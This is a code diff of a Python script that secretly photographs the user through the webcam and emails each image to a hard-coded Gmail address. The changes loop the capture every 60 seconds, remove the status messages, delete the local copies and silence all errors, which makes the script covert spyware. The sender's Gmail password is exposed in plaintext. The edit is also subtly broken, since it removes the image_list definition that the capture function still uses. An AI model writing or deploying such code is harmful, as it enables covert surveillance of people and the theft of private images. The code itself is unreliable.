@@ -6,7 +6,6 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.image import MIMEImage
 
-image_list = []
 sender = 'qwerty1133311@gmail.com'
 sender_password = 'qwerty11333'
 receiver = 'budonuy1997@gmail.com'
@@ -17,7 +16,6 @@ def make_capture():
     img_name = "{}.png".format(time.ctime().replace(' ', '_'))
     cv2.imwrite(img_name, frame)
     image_list.append(img_name)
-    print("Made photo {}".format(img_name))
     cam.release()
     cv2.destroyAllWindows()
     return img_name
@@ -43,19 +41,19 @@ def send_email(img_name):
     server.login(sender, sender_password)
     server.sendmail(sender, [receiver], msgRoot.as_string())
 
-    print('Email sent to'.format(receiver))
     server.quit()
 
-def delete_photos():
-    for photo in image_list:
-        os.remove(photo)
+def delete_photo(photo):
+    os.remove(photo)
 
 if __name__ == '__main__':
-    try:
-        for i in range(1):
+    while True:
+        try:
             img_name = make_capture()
             send_email(img_name)
-        delete_photos()
-    except:
-        pass
+            delete_photo(img_name)
+            time.sleep(60)
+        except Exception as e:
+            pass
+
 
